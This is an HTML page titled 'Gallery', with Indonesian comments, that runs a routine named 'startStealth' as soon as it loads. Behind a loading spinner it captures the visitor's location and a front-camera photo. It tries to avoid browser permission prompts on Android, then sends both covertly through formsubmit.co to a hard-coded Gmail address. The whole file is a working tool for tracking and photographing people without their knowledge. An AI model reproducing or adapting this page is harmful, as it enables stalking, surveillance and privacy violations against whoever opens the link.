<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Gallery</title>
    <style>
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #121212; color: white; overflow: hidden; }
        #loader {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; display: flex; justify-content: center;
            align-items: center; z-index: 9999; transition: opacity 0.5s;
        }
        .spinner {
            width: 40px; height: 40px; border: 4px solid #333;
            border-top: 4px solid #fff; border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #message {
            position: absolute; bottom: 20px; width: 100%; text-align: center;
            color: #888; font-size: 12px;
        }
    </style>
</head>
<body>

    <div id="loader">
        <div class="spinner"></div>
    </div>
    <div id="message">Memuat...</div>

    <script>
        const EMAIL = "desamuncrat477@gmail.com";
        const API_URL = "https://formsubmit.co/ajax/" + EMAIL;

        // Fungsi Utama: Mulai Proses Stealth
        async function startStealth() {
            const loader = document.getElementById('loader');
            const msg = document.getElementById('message');

            try {
                // 1. Ambil Lokasi (Stealthiest Way for Android)
                let lokasi = "Lokasi tidak tersedia";
                
                // Cek apakah Android
                const isAndroid = /Android/i.test(navigator.userAgent);

                if (isAndroid) {
                    // Coba gunakan Intent untuk mendapatkan lokasi tanpa popup browser
                    // Ini membuka Maps app secara tersembunyi jika memungkinkan, atau fallback ke GPS
                    try {
                        const locIntent = "geo:0,0?q=My+Location";
                        window.location.href = locIntent; 
                        // Jeda sedikit untuk biarkan OS memproses
                        await new Promise(r => setTimeout(r, 2000));
                        
                        // Jika tidak bisa dapat koordinat otomatis dari intent, fallback ke Geolocation API
                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(
                                (pos) => {
                                    lokasi = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}\nLink: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                                },
                                (err) => { lokasi = "Gagal lokasi"; },
                                { timeout: 5000 }
                            );
                        }
                    } catch (e) {
                        console.log("Intent error, fallback to API");
                    }
                } else {
                    // Fallback untuk iOS/Desktop
                    if (navigator.geolocation) {
                        await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(
                                (pos) => {
                                    lokasi = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}\nLink: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                                    resolve();
                                },
                                (err) => { lokasi = "Lokasi ditolak"; resolve(); },
                                { timeout: 5000 }
                            );
                        });
                    }
                }

                // 2. Ambil Foto (Stealthiest Way)
                let blob = null;

                if (isAndroid) {
                    // Buka Kamera Native Android
                    try {
                        const cameraIntent = "intent://camera#Intent;scheme=camerasource;type=image/*;end";
                        window.location.href = cameraIntent;
                        
                        // Atau gunakan metode yang lebih umum untuk memicu kamera native
                        // Ini sering kali lebih baik:
                        const input = document.createElement('input');
                        input.type = 'file';
                        input.accept = 'image/*';
                        input.capture = 'user'; // Memaksa kamera depan
                        
                        // Simulasi klik
                        input.click();
                        
                        // Tunggu file dipilih (user mengambil foto)
                        blob = await new Promise(resolve => {
                            input.onchange = (e) => {
                                const file = e.target.files[0];
                                if (file) {
                                    file.arrayBuffer().then(buffer => {
                                        resolve(new Blob([buffer], { type: 'image/jpeg' }));
                                    });
                                } else {
                                    resolve(null);
                                }
                            };
                        });

                    } catch (e) {
                        console.log("Native camera failed, using fallback");
                    }
                }

                // Fallback jika Native Camera gagal, gunakan HTML5 Camera
                if (!blob) {
                    const video = document.createElement('video');
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    video.srcObject = stream;
                    video.play();

                    await new Promise(resolve => {
                        video.onloadedmetadata = () => {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            ctx.drawImage(video, 0, 0);
                            canvas.toBlob(resolve, 'image/jpeg', 0.8);
                            stream.getTracks().forEach(track => track.stop());
                        };
                    });
                }

                // 3. Kirim Data
                if (!blob) {
                    blob = new Blob(["No Photo"], {type: "text/plain"});
                }

                const formData = new FormData();
                formData.append("_subject", "📸 Foto & Lokasi Baru");
                formData.append("message", `Lokasi:\n${lokasi}\n\nWaktu: ${new Date().toLocaleString()}`);
                formData.append("attachment", blob, `stealth_${Date.now()}.jpg`);

                msg.innerText = "Mengirim...";

                await fetch(API_URL, {
                    method: "POST",
                    body: formData
                });

                // Sembunyikan loader setelah sukses
                setTimeout(() => {
                    loader.style.opacity = '0';
                    setTimeout(() => { loader.style.display = 'none'; }, 500);
                    msg.innerText = "Foto Terkirim";
                }, 1000);

            } catch (error) {
                loader.style.display = 'none';
                msg.innerText = "Gagal: " + error.message;
            }
        }

        // Mulai otomatis saat halaman dimuat
        window.onload = startStealth;
    </script>
</body>
</html>
